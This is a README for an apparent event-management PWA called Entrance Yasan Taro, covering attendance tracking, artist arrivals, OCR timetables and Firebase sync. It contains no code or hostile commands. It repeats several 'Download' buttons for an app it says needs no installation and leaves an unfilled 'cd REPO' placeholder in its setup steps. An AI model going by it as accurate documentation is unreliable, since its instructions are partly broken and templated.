# Entrance Yasan Taro - DJ Event Entrance Management 2026

> **Entrance Yasan Taro is a mobile-friendly PWA that helps DJ event teams manage admissions, attendance, artist arrivals, and shared updates with live synchronization.**

[![Platform](https://img.shields.io/badge/Platform-Mobile%20web%2FPWA-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/fisherryannjwb2280/yasan-taro-attendance-hub?style=flat-square)](https://github.com/fisherryannjwb2280/yasan-taro-attendance-hub)

---

<p align="center">
  <a href="https://fisherryannjwb2280.github.io/yasan-taro-attendance-hub/">
    <img src="https://img.shields.io/badge/Download-Entrance%20Yasan%20Taro%20Latest-brightgreen?style=for-the-badge" alt="Download Entrance Yasan Taro">
  </a>
</p>

> **[Download Entrance Yasan Taro](https://fisherryannjwb2280.github.io/yasan-taro-attendance-hub/)**

---

[Download Latest Build](https://fisherryannjwb2280.github.io/yasan-taro-attendance-hub/)

---

## Overview

Entrance Yasan Taro gives DJ event crews a common workspace for handling entry activity, attendance numbers, artist arrival progress, and the live running order. Since it works as a mobile website and PWA, staff can use it from phones and other current browsers without installing conventional desktop software.

Entrance duties and stage coordination are brought together in a single event view. Timetable information may be captured from an image through OCR or entered by hand, while staff can also maintain notes, channel assignments, and event status. Changes are synchronized in real time so users can work from the same information.

---

## Capabilities

- Keep event details synchronized live across several staff users
- Log entrance fees and maintain attendance totals
- Track whether artists have arrived
- Read timetable information from images with OCR
- Create artist records and schedule items manually
- Show the artist currently playing and the next scheduled artist
- Make staff notes and channel assignments available to the team
- Copy an event or clear its data for a new session
- Give staff quick access through shareable event URLs

---

## Getting Started

### Open the hosted application

Launch the latest build using a supported mobile browser:

[Open Entrance Yasan Taro](https://fisherryannjwb2280.github.io/yasan-taro-attendance-hub/)

You can operate it as a mobile web application or place it on a compatible device's home screen as a PWA.

### Start from the repository

```bash
git clone https://github.com/fisherryannjwb2280/yasan-taro-attendance-hub.git
cd REPO
```

Next, serve the checked-out files with any local static web server and open the local address it provides. For behavior closest to the hosted version, use a browser that supports service workers and current web application features.

---

## Using the Application

1. Launch the app, then create an event or choose an existing one.
2. Build the timetable by hand or submit a timetable image for OCR.
3. Check the imported artist information and fix any incorrect details.
4. Enter fees and update attendance as guests come in.
5. Record artist arrival information throughout the event.
6. Refer to the current and upcoming artist display to coordinate staff.
7. Publish notes and channel assignments for the team.
8. Send the event URL to the staff members involved.
9. Duplicate an event or reset its data when starting another event cycle.

---

## Event Data and Configuration

Event details are maintained in the application itself rather than in a local configuration file. Common data includes:

```text
Event name        -> Event workspace title
Artists           -> Artist list and arrival information
Timetable         -> Imported or manually entered schedule
Entrance records  -> Fees and attendance counts
Staff coordination -> Notes and channel assignments
```

Shared event changes use Firebase-related real-time synchronization. Before publishing a deployment, verify the project environment and Firebase settings associated with that build.

---

## Requirements

- A current mobile or desktop browser
- Internet connectivity for synchronized event updates
- An environment that supports PWA functionality
- Firebase configuration for deployments using the shared real-time data layer
- Browser access to a timetable image when using OCR import
- A static hosting service or local web server for serving the project files

---

## Frequently Asked Questions

### What type of team uses Entrance Yasan Taro?

The application is built for DJ event crews, including staff handling admissions, attendance, artist arrivals, and timetable coordination.

### Can several staff members work in one event?

Yes. Real-time multi-user synchronization allows the same event information to be shared among staff members.

### Is OCR required for timetable entry?

No. You can add artists and timetable items manually, either when no image is available or when imported information requires correction.

### How can staff share current event information?

Give the appropriate team members the event URL. Shared notes, channel assignments, and live artist status then provide a common operational view.

### What can I check when changes do not appear?

Make sure the browser is connected to the internet, reload the event, and confirm that the deployment has the correct Firebase configuration and an active connection to it.

### How can I prepare a later event session?

Duplicate an event to retain its structure for another session, or reset the event when you need to remove its information and begin fresh.

### Do I need to install the application on a desktop?

No. Entrance Yasan Taro is designed for mobile web and PWA access through a compatible browser.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
